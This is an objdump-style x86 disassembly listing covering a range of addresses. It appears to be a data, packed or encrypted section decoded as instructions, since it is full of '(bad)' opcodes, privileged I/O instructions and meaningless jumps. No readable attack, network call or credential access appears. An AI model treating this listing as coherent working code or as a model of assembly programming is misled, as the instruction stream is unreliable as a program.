  41f054:	xor    bl,BYTE PTR [eax]
  41f056:	gs sahf 
  41f058:	leave  
  41f059:	dec    edx
  41f05a:	or     BYTE PTR [edx],bl
  41f05c:	ins    DWORD PTR es:[edi],dx
  41f05d:	mov    ds:0x4af9c103,al
  41f062:	aaa    
  41f063:	add    DWORD PTR [edx+0x0],0x1c
  41f067:	mov    ds:0x5db79171,al
  41f06c:	aaa    
  41f06d:	dec    edi
  41f06e:	nop
  41f06f:	cmp    ch,ch
  41f071:	mov    eax,0x2f0b24a5
  41f076:	pop    edi
  41f077:	aad    0xcd
  41f079:	inc    esi
  41f07a:	addps  xmm1,XMMWORD PTR [ebx]
  41f07d:	int3   
  41f07e:	xchg   edi,eax
  41f07f:	call   0xf4fe:0x43688100
  41f086:	out    dx,al
  41f087:	xchg   ecx,eax
  41f088:	loop   0x41f094
  41f08a:	mov    al,0xec
  41f08c:	jge    0x41f088
  41f08e:	ja     0x41f037
  41f090:	and    BYTE PTR [esi],bl
  41f092:	add    bh,BYTE PTR [eax*4+0x7f9adf6a]
  41f099:	sbb    ah,BYTE PTR [ebx+0x6a501349]
  41f09f:	adc    al,0x8a
  41f0a1:	sti    
  41f0a2:	(bad)  
  41f0a3:	mov    eax,ds:0xb579d6fb
  41f0a8:	dec    ebx
  41f0a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f0aa:	stc    
  41f0ab:	outs   dx,DWORD PTR ds:[esi]
  41f0ac:	je     0x41f05c
  41f0ae:	xchg   ecx,eax
  41f0af:	in     al,0x7e
  41f0b1:	cdq    
  41f0b2:	pop    ds
  41f0b3:	mov    ds:0x609b032d,al
  41f0b8:	mov    bl,0x45
  41f0ba:	pop    ecx
  41f0bb:	aas    
  41f0bc:	mov    edx,0x25b5ffb3
  41f0c1:	pusha  
  41f0c2:	daa    
  41f0c3:	adc    esp,DWORD PTR [ecx]
  41f0c5:	aaa    
  41f0c6:	icebp  
  41f0c7:	xchg   edi,eax
  41f0c8:	jge    0x41f056
  41f0ca:	add    esi,DWORD PTR [ebx]
  41f0cc:	test   ebp,esi
  41f0ce:	jmp    DWORD PTR [esp-0x713f47d1]
  41f0d5:	cmp    bh,BYTE PTR [edx-0x4d1b92d6]
  41f0db:	arpl   WORD PTR [ebx],dx
  41f0dd:	aas    
  41f0de:	pop    edx
  41f0df:	mov    eax,gs
  41f0e1:	call   0x4aef4c49
  41f0e6:	neg    DWORD PTR [eax+0x6d2c768b]
  41f0ec:	sbb    DWORD PTR [ebx+0x53],esp
  41f0ef:	inc    esp
  41f0f0:	add    DWORD PTR [ecx+ebx*1-0x2e],esi
  41f0f4:	retf   
  41f0f5:	lock retf 0xc3ed
  41f0f9:	add    BYTE PTR [esi],al
  41f0fb:	mov    ebp,0x685e54c6
  41f100:	cli    
  41f101:	sub    al,0x72
  41f103:	or     dh,BYTE PTR [eax+0x18]
  41f106:	(bad)  
  41f107:	jp     0x41f08e
  41f109:	dec    esp
  41f10a:	stos   WORD PTR es:[edi],ax
  41f10c:	push   eax
  41f10d:	push   ecx
  41f10e:	mov    BYTE PTR [edi-0x5f0c3c2f],ch
  41f114:	out    dx,al
  41f115:	sub    al,0xdd
  41f117:	les    ecx,FWORD PTR [eax+0x6]
  41f11a:	cmp    DWORD PTR [edx],ecx
  41f11c:	lods   al,BYTE PTR ds:[esi]
  41f11d:	and    dl,bh
  41f11f:	pop    eax
  41f120:	pop    edx
  41f121:	cmp    eax,0x91acf2e4
  41f126:	sbb    BYTE PTR [esi+edx*4-0x1f612081],dl
  41f12d:	pop    edi
  41f12e:	fadd   DWORD PTR [ebx+0x78]
  41f131:	sar    BYTE PTR [ebp+eiz*4-0x2c],0xc3
  41f136:	pop    es
  41f137:	(bad)  
  41f138:	cmp    esi,ebp
  41f13a:	pushf  
  41f13b:	cmp    eax,esi
  41f13d:	std    
  41f13e:	fcmovnb st,st(3)
  41f140:	and    dl,BYTE PTR [ebp+0x9]
  41f143:	mul    DWORD PTR [ebx]
  41f145:	pop    ebp
  41f146:	test   al,0x6f
  41f148:	(bad)
  41f14c:	pop    edi
  41f14d:	xor    eax,0x9ceb7154
  41f152:	mov    al,0x26
  41f154:	cmp    al,ah
  41f156:	cmp    esp,esp
  41f158:	push   ecx
  41f159:	lock bound ecx,QWORD PTR ds:[edx-0x33eaa09f]
  41f161:	in     al,dx
  41f162:	xchg   edx,eax
  41f163:	lds    ecx,FWORD PTR [ecx+edi*4-0x6e]
  41f167:	pop    esi
  41f168:	dec    edx
  41f169:	jl     0x41f163
  41f16b:	mov    bh,0x7f
  41f16d:	jnp    0x41f152
  41f16f:	iret   
  41f170:	mov    cl,0x4b
  41f172:	xchg   esp,eax
  41f173:	inc    ebp
  41f174:	fisttp WORD PTR [ebx-0x2c31304e]
  41f17a:	push   edi
  41f17b:	sub    edx,esi
  41f17d:	xor    DWORD PTR [ebx],esi
  41f17f:	dec    eax
  41f180:	adc    dl,bl
  41f182:	cli    
  41f183:	pop    ebx
  41f184:	jnp    0x41f173
  41f186:	aaa    
  41f187:	not    ch
  41f189:	rol    DWORD PTR [ecx-0x41eef7bb],1
  41f18f:	inc    ebx
  41f190:	lahf   
  41f191:	imul   esp,esi,0xfb785bdf
  41f197:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f198:	sbb    edi,edi
  41f19a:	fs (bad) 
  41f19c:	xchg   ebx,eax
  41f19d:	mov    edi,0xe012852
  41f1a2:	(bad)  
  41f1a3:	fisttp QWORD PTR [edi-0x6e691823]
  41f1a9:	push   ebp
  41f1aa:	mov    DWORD PTR [ebx-0x9],esp
  41f1ad:	retf   0x890e
  41f1b0:	adc    dl,cl
  41f1b2:	and    ebp,DWORD PTR [esi-0x5134909f]
  41f1b8:	dec    ecx
  41f1b9:	jmp    0xa52374af
  41f1be:	jl     0x41f1b1
  41f1c0:	xchg   ebx,eax
  41f1c1:	rcr    DWORD PTR [edx+edi*2-0x2506fd35],0x42
  41f1c9:	push   edx
  41f1ca:	push   ecx
  41f1cb:	xor    DWORD PTR [eax],edx
  41f1cd:	jge    0x41f16e
  41f1cf:	daa    
  41f1d0:	pop    ebp
  41f1d1:	adc    bh,al
  41f1d3:	cmp    al,0x94
  41f1d5:	push   0x14
  41f1d7:	out    0xae,eax
  41f1d9:	lahf   
  41f1da:	mov    eax,ebx
  41f1dc:	rcl    BYTE PTR [edi-0x57],1
  41f1df:	(bad)  
  41f1e0:	in     al,0x9a
  41f1e2:	inc    ebx
  41f1e3:	int    0xf1
  41f1e5:	cmc    
  41f1e6:	dec    ecx
  41f1e7:	sub    ch,BYTE PTR [eax+0x1]
  41f1ea:	add    dl,dh
  41f1ec:	aaa    
  41f1ed:	iret   
  41f1ee:	and    ch,BYTE PTR [edi+0x3]
  41f1f1:	push   ss
  41f1f2:	leave  
  41f1f3:	or     edx,DWORD PTR [edi+ecx*2]
  41f1f6:	mov    edx,0xf4c95c53
  41f1fb:	dec    esp
  41f1fc:	push   esp
  41f1fd:	dec    eax
  41f1fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1ff:	aad    0x81
  41f201:	and    ah,0x51
  41f204:	pop    ebp
  41f205:	jg     0x41f281
  41f207:	adc    al,0x4
  41f209:	in     al,dx
  41f20a:	lods   eax,DWORD PTR ds:[esi]
  41f20b:	nop
  41f20c:	pop    edi
  41f20d:	mov    ds:0xd4ba0064,al
  41f212:	mov    eax,ecx
  41f214:	fcomi  st,st(3)
  41f216:	and    al,0xe
  41f218:	enter  0x7174,0x8a
  41f21c:	dec    esi
  41f21d:	arpl   WORD PTR [esi+0x2e],bp
  41f220:	mov    edx,0x4c7d7f7b
  41f225:	in     al,0x8b
  41f227:	jl     0x41f26f
  41f229:	gs test al,0x99
  41f22c:	push   es
  41f22d:	clc    
  41f22e:	inc    edx
  41f22f:	mov    cl,0x71
  41f231:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f232:	sub    esi,DWORD PTR ds:0x617f981c
  41f238:	icebp  
  41f239:	enter  0x60bf,0xe7
  41f23d:	ja     0x41f23c
  41f23f:	icebp  
  41f240:	fldcw  WORD PTR [ecx]
  41f242:	pop    ss
  41f243:	das    
	...
  41f250:	add    BYTE PTR [eax],dh
  41f252:	ret    0xe921
  41f255:	repz jmp 0x41f250
  41f258:	fcmovnb st,st(3)
  41f25a:	pop    ebp
  41f25b:	sbb    DWORD PTR [ecx+0x4a],ebx
  41f25e:	cmp    eax,0x6d1752f3
  41f263:	add    DWORD PTR [eax],eax
  41f265:	stos   DWORD PTR es:[edi],eax
  41f266:	add    eax,DWORD PTR [eax]
  41f268:	add    BYTE PTR [edi],cl
  41f26a:	cmp    edx,DWORD PTR [esi+ebx*8+0x42]
  41f26e:	test   DWORD PTR [edx-0x1c5f4dfc],edi
  41f274:	ins    DWORD PTR es:[edi],dx
  41f275:	scas   al,BYTE PTR es:[edi]
  41f276:	out    0xa9,eax
  41f278:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f279:	adc    cl,bh
  41f27b:	call   0x658f3477
  41f280:	mov    al,BYTE PTR [eax+esi*1-0x73026ce]
  41f287:	xchg   ebx,eax
  41f288:	pop    eax
  41f289:	pop    edi
  41f28a:	xchg   bl,cl
  41f28c:	jge    0x41f2bd
  41f28e:	jmp    0x41f21f
  41f290:	mov    eax,DWORD PTR [ebx]
  41f292:	push   0x69822873
  41f297:	jmp    0xf7ba72a0
  41f29c:	shl    bh,0x3a
  41f29f:	pop    ss
  41f2a0:	popa   
  41f2a1:	cdq    
  41f2a2:	push   eax
  41f2a3:	mov    ebx,DWORD PTR ds:0xe68b3d81
  41f2a9:	mov    bh,0xf7
  41f2ab:	dec    ebx
  41f2ac:	mov    ds:0xb7ad18a6,al
  41f2b1:	shr    BYTE PTR [eax-0x28741f59],cl
  41f2b7:	shl    DWORD PTR [esi-0x3c],cl
  41f2ba:	lahf   
  41f2bb:	mul    DWORD PTR [ebx-0x40]
  41f2be:	leave  
  41f2bf:	das    
  41f2c0:	stos   BYTE PTR es:[edi],al
  41f2c1:	dec    ebp
  41f2c2:	inc    edi
  41f2c3:	xchg   ebp,eax
  41f2c4:	jl     0x41f31f
  41f2c6:	push   0xa44dc235
  41f2cb:	adc    eax,0x8adaf1a9
  41f2d0:	mul    esi
  41f2d2:	ds in  eax,0x7b
  41f2d5:	ret    
  41f2d6:	(bad)  
  41f2d7:	adc    ah,ch
  41f2d9:	ss cmp ah,BYTE PTR ds:[edi+0x4f]
  41f2de:	mov    cl,BYTE PTR [esi]
  41f2e0:	push   es
  41f2e1:	sbb    eax,0x7e143b50
  41f2e6:	lods   eax,DWORD PTR ds:[esi]
  41f2e7:	neg    BYTE PTR [ebx-0x5318922c]
  41f2ed:	sub    al,0x61
  41f2ef:	jae    0x41f36a
  41f2f1:	or     BYTE PTR [eax+0x1b540ec1],cl
  41f2f7:	cli    
  41f2f8:	push   ds
  41f2f9:	pop    esi
  41f2fa:	out    0x2,al
  41f2fc:	loopne 0x41f375
  41f2fe:	scas   eax,DWORD PTR es:[edi]
  41f2ff:	and    DWORD PTR [ecx+0x77],edi
  41f302:	repz iret 
  41f304:	shl    DWORD PTR [ecx],0xbb
  41f307:	inc    ecx
  41f308:	mov    al,0x90
  41f30a:	loope  0x41f346
  41f30c:	jecxz  0x41f308
  41f30e:	inc    esi
  41f30f:	sahf   
  41f310:	mov    BYTE PTR [ebp+0x3c9307a9],dh
  41f316:	enter  0x37ab,0x88
  41f31a:	pop    ss
  41f31b:	dec    esp
  41f31c:	push   ds
  41f31d:	xchg   ebx,eax
  41f31e:	push   ebp
  41f31f:	addr16 push ebx
  41f321:	sete   BYTE PTR [esi-0x2636e979]
  41f328:	and    al,0xaa
  41f32a:	xchg   esp,eax
  41f32b:	adc    bh,BYTE PTR [edi]
  41f32d:	mov    edi,fs
  41f32f:	loope  0x41f2ef
  41f331:	aaa    
  41f332:	push   ebp
  41f333:	je     0x41f345
  41f335:	dec    esi
  41f336:	imul   esp,DWORD PTR [ebx-0x38],0xccd760b7
  41f33d:	xor    BYTE PTR [edx+0x4],0xe5
  41f341:	(bad)  
  41f342:	ins    BYTE PTR es:[edi],dx
  41f343:	cmc    
  41f344:	popa   
  41f345:	or     DWORD PTR [eax+ebp*1+0x52],ecx
  41f349:	push   edi
  41f34a:	fsub   DWORD PTR [edx+0x11096859]
  41f350:	xchg   esi,eax
  41f351:	fcom   DWORD PTR [ebp-0x7f834522]
  41f357:	aas    
  41f358:	test   DWORD PTR [ecx+0x22f0ce3c],eax
  41f35e:	rcr    DWORD PTR [esp+edi*8],1
  41f361:	pop    ebx
  41f362:	das    
  41f363:	out    0xf5,eax
  41f365:	movlps QWORD PTR [ecx+ebp*1+0x47e9dc7],xmm4
  41f36d:	or     ecx,edx
  41f36f:	shl    DWORD PTR [esi-0x72],1
  41f372:	jmp    0x3e23:0xba97e1cc
  41f379:	jnp    0x41f319
  41f37b:	mov    ds:0x73cc8b8b,eax
  41f380:	sahf   
  41f381:	push   ecx
  41f382:	icebp  
  41f383:	imul   edx,ebx,0x2c
  41f386:	ret    0x59c5
  41f389:	pop    ds
  41f38a:	in     al,0xca
  41f38c:	pop    esi
  41f38d:	test   bl,0xfc
  41f390:	int3   
  41f391:	js     0x41f3e4
  41f393:	inc    ebp
  41f394:	or     ebx,ecx
  41f396:	(bad)  
  41f397:	push   esp
  41f398:	stos   DWORD PTR es:[edi],eax
  41f399:	and    edx,ebp
  41f39b:	leave  
  41f39c:	adc    al,0xec
  41f39e:	shr    BYTE PTR [ecx],1
  41f3a0:	or     BYTE PTR [esi+ebp*4+0xe],bh
  41f3a4:	mov    eax,ds:0xd81477ec
  41f3a9:	cwde   
  41f3aa:	or     eax,0xd41a17c1
  41f3af:	mov    al,ds:0x8aca1ad
  41f3b4:	ficomp WORD PTR ds:0x5b88ad60
  41f3ba:	add    edi,ebp
  41f3bc:	hlt    
  41f3bd:	push   eax
  41f3be:	es mov bh,0x3e
  41f3c1:	sub    edx,eax
  41f3c3:	icebp  
  41f3c4:	ror    DWORD PTR [ebx+0x23ba6da5],0x10
  41f3cb:	xor    BYTE PTR [eax],ah
  41f3cd:	outs   dx,BYTE PTR ds:[esi]
  41f3ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f3cf:	cld    
  41f3d0:	outs   dx,BYTE PTR ds:[esi]
  41f3d1:	mov    ds:0x485fe3b1,al
  41f3d6:	int3   
  41f3d7:	jae    0x41f3ee
  41f3d9:	adc    BYTE PTR ds:0x5443cb8e,bl
  41f3df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f3e0:	addr16 ret 0xeacc
  41f3e4:	push   0x56
  41f3e6:	retf   
  41f3e7:	daa    
  41f3e8:	ja     0x41f374
  41f3ea:	adc    al,0x39
  41f3ec:	pop    ds
  41f3ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f3ee:	imul   edx,DWORD PTR [esi-0x5f],0x885d4bc4
  41f3f5:	ins    BYTE PTR es:[edi],dx
  41f3f6:	rcl    BYTE PTR [ebp-0x62],1
  41f3f9:	sbb    eax,DWORD PTR [ecx+eax*2-0x53294aa]
  41f400:	sbb    al,0xe9
  41f402:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f403:	fldcw  WORD PTR [edi+ecx*8-0x36]
  41f407:	inc    eax
  41f408:	dec    ebp
  41f409:	or     DWORD PTR [edi-0x74],esi
  41f40c:	jb     0x41f3f1
  41f40e:	adc    BYTE PTR [ebx+0x557f3f56],cl
  41f414:	lock or esi,DWORD PTR ds:0xba679666
  41f41b:	pop    eax
  41f41c:	mov    ds:0x4661ce10,eax
  41f421:	inc    eax
  41f422:	and    ecx,DWORD PTR ds:0x881f1949
  41f428:	adc    eax,0x7c427815
  41f42d:	popa   
  41f42e:	inc    ebx
  41f42f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f430:	ds mov esp,0xb745875
  41f436:	jg     0x41f4a4
  41f438:	push   edi
  41f439:	addr16 call 0xfd27:0xc5db43b6
  41f441:	retf   0x2e0a
  41f444:	cmp    bh,cl
  41f446:	dec    ah
  41f448:	xor    DWORD PTR [eax],eax
  41f44a:	out    dx,eax
  41f44b:	inc    BYTE PTR [ebx+0x73]
  41f44e:	adc    al,0x62
  41f450:	dec    ecx
  41f451:	retf   0x5783
  41f454:	xor    eax,0xe5465157
  41f459:	sbb    dh,ch
  41f45b:	mov    WORD PTR [ebp+0x3da4dea6],fs
  41f461:	scas   al,BYTE PTR es:[edi]
  41f462:	add    edi,edi
  41f464:	leave  
  41f465:	test   ebx,0xd06714a8
  41f46b:	sub    edi,edx
  41f46d:	out    dx,al
  41f46e:	sti    
  41f46f:	pop    ss
  41f470:	pop    eax
  41f471:	sbb    ebp,eax
  41f473:	shl    DWORD PTR [ebx+0x27],cl
  41f476:	(bad)  
  41f477:	dec    ebx
  41f478:	pop    edx
  41f479:	sbb    BYTE PTR [edx+0x6478ab9d],bl
  41f47f:	outs   dx,DWORD PTR ds:[esi]
  41f480:	cmp    DWORD PTR [edx-0x19d92454],0x7347890a
  41f48a:	sub    al,0xd5
  41f48c:	sub    BYTE PTR [esi],dh
  41f48e:	inc    esp
  41f48f:	mov    edx,0xc1082333
  41f494:	repnz std 
  41f496:	jae    0x41f451
  41f498:	retf   
  41f499:	adc    DWORD PTR [ecx],0xffffffc8
  41f49c:	in     eax,0x21
  41f49e:	jnp    0x41f4f9
  41f4a0:	loop   0x41f492
  41f4a2:	xor    ebp,DWORD PTR [edi-0x4d]
  41f4a5:	add    al,0xe8
  41f4a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4a8:	push   DWORD PTR [edi]
  41f4aa:	popf   
  41f4ab:	loope  0x41f43a
  41f4ad:	fcmovu st,st(0)
  41f4af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f4b0:	leave  
  41f4b1:	push   ecx
  41f4b2:	xor    al,0x58
  41f4b4:	dec    edx
  41f4b5:	stc    
  41f4b6:	cmp    eax,0xd5bfa3cd
  41f4bb:	inc    ebx
  41f4bc:	sub    edi,DWORD PTR [edi]
  41f4be:	nop
  41f4bf:	mov    DWORD PTR [ecx-0x26],edi
  41f4c2:	inc    eax
  41f4c3:	dec    ebx
  41f4c4:	jae    0x41f47b
  41f4c6:	mov    DWORD PTR [edi],eax
  41f4c8:	retf   0xce7
  41f4cb:	iret   
  41f4cc:	rol    DWORD PTR [esi+0x3e],0xb6
  41f4d0:	jo     0x41f502
  41f4d2:	jnp    0x41f467
  41f4d4:	jnp    0x41f495
  41f4d6:	push   0xe2eed9b4
  41f4db:	neg    BYTE PTR [edx-0x38]
  41f4de:	inc    edx
  41f4df:	dec    eax
  41f4e0:	push   es
  41f4e1:	adc    edx,DWORD PTR [eax-0x1f2d154f]
  41f4e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4e8:	into   
  41f4e9:	jecxz  0x41f559
  41f4eb:	sub    BYTE PTR [eax-0x1f],0x18
  41f4ef:	push   ebp
  41f4f0:	jge    0x41f4a7
  41f4f2:	push   0x23
  41f4f4:	sbb    esi,DWORD PTR [esi+0x28]
  41f4f7:	addr16 inc eax
  41f4f9:	pop    ecx
  41f4fa:	test   eax,0xbaac3793
  41f4ff:	in     al,dx
  41f500:	div    DWORD PTR [esi-0x16]
  41f503:	(bad)  
  41f504:	pop    esp
  41f505:	xchg   esi,eax
  41f506:	bound  ebp,QWORD PTR [edx-0x59cc8432]
  41f50c:	mov    eax,DWORD PTR [ebx-0x4bd099a1]
  41f512:	sub    eax,0xa3c940fb
  41f517:	inc    ebp
  41f518:	xchg   DWORD PTR [eax+0x1260973c],eax
  41f51e:	and    esp,0x68
  41f521:	rcr    DWORD PTR [ebx-0x22fbd4a1],0xba
  41f528:	(bad)  
  41f52a:	jo     0x41f4b5
  41f52c:	mov    al,0xb0
  41f52e:	xchg   BYTE PTR [ebx+0x39],dl
  41f531:	psubsb mm3,mm1
  41f534:	ja     0x41f528
  41f536:	retf   0xa901
  41f539:	xlat   BYTE PTR ds:[ebx]
  41f53a:	mov    ds:0xcadd55df,eax
  41f53f:	push   cs
  41f540:	jecxz  0x41f5b3
  41f542:	addr16 inc ecx
  41f544:	daa    
  41f545:	jo     0x41f598
  41f547:	and    al,BYTE PTR [ecx-0x6359ef19]
  41f54d:	jae    0x41f53e
  41f54f:	push   edi
  41f550:	lds    esi,FWORD PTR [edi-0x2f]
  41f553:	xchg   DWORD PTR [esi],esp
  41f555:	test   al,0x8b
  41f557:	test   BYTE PTR [esi-0x7cbdab62],0x75
  41f55e:	iret   
  41f55f:	fild   QWORD PTR ds:0x49f91d85
  41f565:	xor    eax,0x721436a
  41f56a:	jecxz  0x41f59f
  41f56c:	dec    ebp
  41f56d:	inc    esi
  41f56e:	or     BYTE PTR [ebx],bh
  41f570:	jne    0x41f55d
  41f572:	loope  0x41f58c
  41f574:	test   DWORD PTR [ecx-0x6],ecx
  41f577:	in     eax,0xd7
  41f579:	stos   BYTE PTR es:[edi],al
  41f57a:	stos   BYTE PTR es:[edi],al
  41f57b:	mov    al,ds:0xe4f38c4
  41f580:	pop    ebx
  41f581:	inc    edx
  41f582:	xor    ch,al
  41f584:	mov    ebp,0x558ab7f0
  41f589:	mov    bh,0xfc
  41f58b:	sub    BYTE PTR [ebp+0x57],bl
  41f58e:	and    dl,BYTE PTR [edx-0x16]
  41f591:	mov    ds:0xbf211b10,eax
  41f596:	jmp    0x7a01:0xc4ed36ee
  41f59d:	sbb    eax,0x3fba2311
  41f5a2:	push   0x5e
  41f5a4:	(bad)  
  41f5a5:	xlat   BYTE PTR ds:[ebx]
  41f5a6:	and    BYTE PTR [ebx],dh
  41f5a8:	xchg   ebp,eax
  41f5a9:	inc    ebp
  41f5aa:	jo     0x41f626
  41f5ac:	sbb    eax,0x14f28aae
  41f5b1:	jge    0x41f578
  41f5b3:	xor    al,BYTE PTR [esp+ebp*8]
  41f5b6:	cwde   
  41f5b7:	cld    
  41f5b8:	mov    ebx,0xd24c656f
  41f5bd:	sahf   
  41f5be:	ret    
  41f5bf:	test   al,0x70
  41f5c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f5c2:	ret    
  41f5c3:	cli    
  41f5c4:	jmp    0x41f625
  41f5c6:	fld    QWORD PTR [eax]
  41f5c8:	test   al,0xea
  41f5ca:	xor    eax,0xd062f2b7
  41f5d0:	into   
  41f5d1:	push   0x2e4adaa1
  41f5d6:	rol    ch,1
  41f5d8:	imul   edx,DWORD PTR [eax],0x6ddc8129
  41f5de:	repnz mov ch,0x4d
  41f5e1:	inc    eax
  41f5e2:	addr16 xchg ecx,eax
  41f5e4:	adc    al,0xe6
  41f5e6:	xchg   edx,eax
  41f5e7:	(bad)  
  41f5e8:	aam    0x4b
  41f5ea:	retf   0x1461
  41f5ed:	jno    0x41f647
  41f5ef:	mov    esp,0xcd419eeb
  41f5f4:	jle    0x41f62a
  41f5f6:	jb     0x41f662
  41f5f8:	xor    esi,DWORD PTR [esi+0x2c]
  41f5fb:	ins    BYTE PTR es:[edi],dx
  41f5fc:	(bad)  
  41f5fd:	imul   ebx,DWORD PTR [edx],0x944a270e
  41f603:	cmp    BYTE PTR es:[esi],0xe2
  41f607:	sbb    eax,0x3ff3b63a
  41f60c:	adc    bl,BYTE PTR [edx+esi*2-0x7f57edc9]
  41f613:	inc    edi
	...
  41f620:	add    BYTE PTR [edx+0x5],al
  41f623:	and    BYTE PTR [eax+0x67],ah
  41f626:	gs inc edx
  41f628:	daa    
  41f629:	sti    
  41f62a:	mov    ch,0xb1
  41f62c:	push   edx
  41f62d:	adc    dh,BYTE PTR [eax]
  41f62f:	jmp    0x1b2b864
  41f634:	add    BYTE PTR [ebx-0x55fffffd],ch
  41f63a:	push   ds
  41f63b:	ins    BYTE PTR es:[edi],dx
  41f63c:	xchg   BYTE PTR ds:[edi+0x7634f559],bl
  41f643:	adc    al,0x9b
  41f645:	enter  0x9cea,0xde
  41f649:	add    BYTE PTR [eax+0x4708f6db],dl
  41f64f:	arpl   WORD PTR [ebx-0x68],sp
  41f652:	fcomp  QWORD PTR [ebp+0xc]
  41f655:	psrlw  mm4,QWORD PTR [ebx+0x7090142e]
  41f65c:	push   edx
  41f65d:	xor    eax,0x8956db73
  41f662:	pop    esi
  41f663:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f664:	cmp    bl,al
  41f666:	inc    ebp
  41f667:	bound  ecx,QWORD PTR [ebx]
  41f669:	sub    BYTE PTR [edx],bl
  41f66b:	cmp    DWORD PTR ds:[edi],edi
  41f66e:	cmp    ch,0x8b
  41f671:	pop    edi
  41f672:	jmp    0x41f6c7
  41f674:	mov    bl,0xda
  41f676:	cwde   
  41f677:	mov    ds:0x322710b8,eax
  41f67c:	dec    edi
  41f67d:	icebp  
  41f67e:	ret    0xf6a6
  41f681:	packsswb mm3,QWORD PTR [ebp+0x36]
  41f685:	addr16 in eax,0x8
  41f688:	and    esp,DWORD PTR [ecx-0x3d88d120]
  41f68e:	out    0x47,eax
  41f690:	push   edx
  41f691:	sbb    al,0x7
  41f693:	mov    al,ds:0x918e6369
  41f698:	xchg   DWORD PTR [ebp+0x74ac118c],edx
  41f69e:	popa   
  41f69f:	cmp    edx,DWORD PTR [ecx+eax*1+0x201f5ff8]
  41f6a6:	or     al,0x81
  41f6a8:	jle    0x41f6b4
  41f6aa:	mov    edx,0x2cf23ab1
  41f6af:	push   ebp
  41f6b0:	mov    ah,0xec
  41f6b2:	and    ebp,ebx
  41f6b4:	mov    esp,0x575fb76d
  41f6b9:	or     ch,BYTE PTR [edi*1+0x54705400]
  41f6c0:	daa    
  41f6c1:	fsub   QWORD PTR [eax+0x543d5f62]
  41f6c7:	test   BYTE PTR [ecx],bh
  41f6c9:	mov    esp,0xeacc9070
  41f6ce:	rcr    BYTE PTR [esi],1
  41f6d0:	add    ebp,DWORD PTR [esi]
  41f6d2:	sub    esp,DWORD PTR [edx+0x47]
  41f6d5:	add    BYTE PTR [esi+0x637011f3],0xf6
  41f6dc:	mov    bh,0xd1
  41f6de:	and    esi,ecx
  41f6e0:	xchg   edx,eax
  41f6e1:	mov    ss,WORD PTR [eax-0x1b]
  41f6e4:	push   0xbf5499c
  41f6e9:	mov    cl,0x7
  41f6eb:	and    bh,BYTE PTR [edi-0xb]
  41f6ee:	and    eax,0xbf7d0131
  41f6f3:	mov    bl,BYTE PTR [eax+0x1f]
  41f6f6:	ja     0x41f72d
  41f6f8:	fbld   TBYTE PTR [edi+0x70522c55]
  41f6fe:	jb     0x41f74c
  41f700:	stos   DWORD PTR es:[edi],eax
  41f701:	(bad)  
  41f702:	ja     0x41f725
  41f704:	cwde   
  41f705:	sub    al,0xbd
  41f707:	add    eax,0x397b1990
  41f70c:	es dec edi
  41f70e:	inc    eax
  41f70f:	adc    edi,DWORD PTR [ebx]
  41f711:	mov    al,ds:0xd7f7187c
  41f716:	imul   ecx
  41f718:	mov    BYTE PTR [ebp+0x27],dh
  41f71b:	jecxz  0x41f6ad
  41f71d:	xchg   edi,eax
  41f71e:	ds push edx
  41f720:	ror    BYTE PTR [edx+edi*1-0x7d],cl
  41f724:	sbb    DWORD PTR [edi+0x60743fd5],0x6d27ecdd
  41f72e:	jecxz  0x41f72c
  41f730:	inc    ebx
  41f731:	jp     0x41f78a
  41f733:	enter  0xc52e,0x66
  41f737:	and    DWORD PTR [edx-0x7db7595f],eax
  41f73d:	inc    ecx
  41f73e:	fild   DWORD PTR [ebp+0xdd42f10]
  41f744:	cmp    DWORD PTR [eax+0x6],0xfc091cc8
  41f74b:	dec    ebx
  41f74c:	sub    ebp,esp
  41f74e:	mov    dh,0xac
  41f750:	lock imul ebx,esi,0x60a4bb61
  41f757:	pop    ss
  41f758:	pop    ebp
  41f759:	mov    ebp,0x30b9c18
  41f75e:	push   ss
  41f75f:	std    
  41f760:	mov    ebp,0x6fbf5d30
  41f765:	push   edx
  41f766:	mov    cl,0x64
  41f768:	jo     0x41f7c3
  41f76a:	sub    al,0x64
  41f76c:	mov    ch,0x5d
  41f76e:	fstp   DWORD PTR [ecx]
  41f770:	lea    esp,[edi+0x36]
  41f773:	push   ds
  41f774:	jbe    0x41f730
  41f776:	xor    ebp,DWORD PTR [edi-0x1660baf0]
  41f77c:	xchg   BYTE PTR [ebp+esi*2-0x4ce3ce48],cl
  41f783:	sbb    dl,BYTE PTR [ecx-0x1c]
  41f786:	lahf   
  41f787:	dec    esi
  41f788:	push   edx
  41f789:	add    eax,0x9e72d880
  41f78e:	xchg   edx,eax
  41f78f:	sub    BYTE PTR [ebx+0x2e],bh
  41f792:	ret    0xf924
  41f795:	popf   
  41f796:	push   edx
  41f797:	adc    eax,0x8c630bde
  41f79c:	sub    al,0xae
  41f79e:	cmp    al,0xd0
  41f7a0:	adc    BYTE PTR [edi-0x67f2aadf],ch
  41f7a6:	cwde   
  41f7a7:	dec    eax
  41f7a8:	bound  ecx,QWORD PTR ds:0x9e0c99b6
  41f7ae:	xor    al,0x5b
  41f7b0:	fdivr  st,st(0)
  41f7b2:	rcr    DWORD PTR [ebx-0x47],cl
  41f7b5:	pop    ebx
  41f7b6:	(bad)
  41f7b9:	inc    edx
  41f7ba:	std    
  41f7bb:	push   ss
  41f7bc:	dec    ebp
  41f7bd:	add    al,al
  41f7bf:	push   esp
  41f7c0:	aad    0x34
  41f7c2:	xchg   esp,eax
  41f7c3:	das    
  41f7c4:	xor    eax,0x66d431cc
  41f7c9:	or     eax,0xea37df09
  41f7ce:	adc    DWORD PTR [esi+0x4472ec48],esi
